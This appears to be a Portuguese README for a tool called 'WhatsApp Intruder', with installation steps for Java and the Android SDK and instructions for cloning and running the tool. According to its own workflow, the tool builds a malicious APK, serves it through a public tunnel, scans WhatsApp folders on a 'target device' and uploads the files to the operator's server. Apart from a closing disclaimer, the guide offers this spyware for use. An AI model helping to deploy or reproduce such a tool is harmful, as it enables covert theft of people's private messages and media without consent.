📋 Pré-requisitos
Sistema Operacional
Ubuntu 20.04+ / Debian 11+ / Kali Linux

Ou qualquer distribuição Linux com suporte a Java 17

Requisitos Mínimos
4GB RAM (8GB recomendado)

10GB espaço em disco

Conexão internet estável

🛠 Instalação Completa
1. Atualizar Sistema
bash
sudo apt-get update
sudo apt-get upgrade -y
2. Instalar Java 17 (OBRIGATÓRIO)
bash
# Instalar Java 17
sudo apt install openjdk-17-jdk openjdk-17-jre -y

# Configurar variáveis de ambiente
sudo nano /etc/environment
Adicione estas linhas ao arquivo:

text
JAVA_HOME="/usr/lib/jvm/java-17-openjdk-amd64"
PATH="$PATH:$JAVA_HOME/bin"
Recarregue as variáveis:

bash
source /etc/environment

# Verificar instalação
java -version
javac -version
echo $JAVA_HOME
3. Instalar Dependências do Sistema
bash
# Ferramentas essenciais
sudo apt install curl wget git unzip zip -y

# Bibliotecas 32-bit (necessárias para Android SDK)
sudo apt install lib32z1 lib32ncurses5 lib32stdc++6 lib32gcc-s1 -y

# Ferramentas de build
sudo apt install apksigner -y

# PHP e SSH (para servidor)
sudo apt install php ssh-client -y
4. Instalar Android SDK (Sem Android Studio)
Método 1: Command Line Tools Only
bash
# Criar diretório Android
mkdir -p ~/android-sdk
cd ~/android-sdk

# Baixar Command Line Tools
wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
unzip commandlinetools-linux-9477386_latest.zip

# Criar estrutura de diretórios
mkdir cmdline-tools
mv tools cmdline-tools/latest

# Configurar variáveis de ambiente
echo 'export ANDROID_HOME="$HOME/android-sdk"' >> ~/.bashrc
echo 'export PATH="$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools"' >> ~/.bashrc
source ~/.bashrc

# Aceitar licenças
yes | sdkmanager --licenses

# Instalar SDK necessário
sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.2"

# Verificar instalação
sdkmanager --list
Método 2: Com Android Studio (Recomendado para desenvolvimento)
bash
# Baixar Android Studio
wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2022.3.1.18/android-studio-2022.3.1.18-linux.tar.gz

# Extrair para /opt
sudo tar -xzf android-studio-2022.3.1.18-linux.tar.gz -C /opt

# Criar link simbólico
sudo ln -s /opt/android-studio/bin/studio.sh /usr/local/bin/android-studio

# Executar Android Studio para configurar SDK
android-studio
5. Configurar Environment do Android SDK
bash
# Adicionar ao ~/.bashrc ou ~/.zshrc
echo 'export ANDROID_SDK_ROOT="$HOME/Android/Sdk"' >> ~/.bashrc
echo 'export PATH="$PATH:$ANDROID_SDK_ROOT/platform-tools"' >> ~/.bashrc
echo 'export PATH="$PATH:$ANDROID_SDK_ROOT/tools"' >> ~/.bashrc
echo 'export PATH="$PATH:$ANDROID_SDK_ROOT/tools/bin"' >> ~/.bashrc
source ~/.bashrc
6. Instalar e Configurar o WhatsApp Intruder
bash
# Clonar repositório
git clone https://github.com/ALPHA-HACKGOD/WhatsAppHack.git
cd WhatsAppHack

# Dar permissão de execução
chmod +x whatsapphack.sh

# Verificar dependências
./whatsapphack.sh
🚀 Como Usar
Execução Básica
bash
cd WhatsAppHack
./whatsapphack.sh
Fluxo de Operação:
Build Automático: O script compila o APK automaticamente

Servidor Local: Inicia servidor PHP na porta 3333

Túnel Público: Cria URL pública via Serveo.net/localhost.run

Download APK: Disponibiliza APK para download

Recebe Arquivos: Arquivos são enviados para uploadedfiles/

Estrutura de Arquivos
text
WhatsAppHack/
├── whatsapphack.sh          # Script principal
├── app.apk                  # APK gerado
├── uploadedfiles/           # Arquivos recebidos
├── app/                    # Código fonte Android
│   ├── app/src/main/java/com/whatsapphack/
│   └── app/src/main/res/
├── key.keystore            # Certificado de assinatura
└── generated_urls.txt      # URLs geradas
🔧 Solução de Problemas
Erro Java Version
bash
# Verificar versão Java
java -version

# Se não for Java 17, configurar alternativas
sudo update-alternatives --config java
# Selecionar Java 17
Erro de Permissão Android SDK
bash
# Dar permissão ao diretório SDK
sudo chown -R $USER:$USER ~/android-sdk
sudo chmod -R 755 ~/android-sdk
Erro de Build
bash
# Limpar cache e rebuild
cd app
./gradlew clean
./gradlew build
Servidor Não Inicia
bash
# Verificar se porta está livre
netstat -tulpn | grep :3333

# Parar processos PHP
pkill -f "php -S"

# Reiniciar servidor manualmente
php -S 0.0.0.0:3333
📝 Notas Importantes
Funcionalidades
✅ Scan automático de diretórios do WhatsApp

✅ Upload em tempo real para servidor

✅ Túnel público automático

✅ Build automático do APK

✅ Interface de progresso em tempo real

Limitações Conhecidas
Requer Android 6.0+

WhatsApp deve estar instalado no dispositivo alvo

Pode requerer permissões manuais no Android 11+

Funciona apenas com Java 17

Segurança
APK assinado com certificado próprio

Comunicação via HTTP (para demonstração)

Arquivos salvos com timestamp para evitar sobrescrita

⚖️ Aviso Legal
Este software é fornecido apenas para fins educacionais. O uso desta ferramenta para:

Acessar dispositivos sem autorização

Coletar dados pessoais sem consentimento

Realizar atividades maliciosas

É STRITAMENTE PROIBIDO e pode resultar em consequências legais severas.

O desenvolvedor não se responsabiliza pelo uso indevido desta ferramenta. Use com responsabilidade e apenas em ambientes onde você tem autorização explícita.

🔗 Links Úteis
Documentação Android

Java JDK 17

Android SDK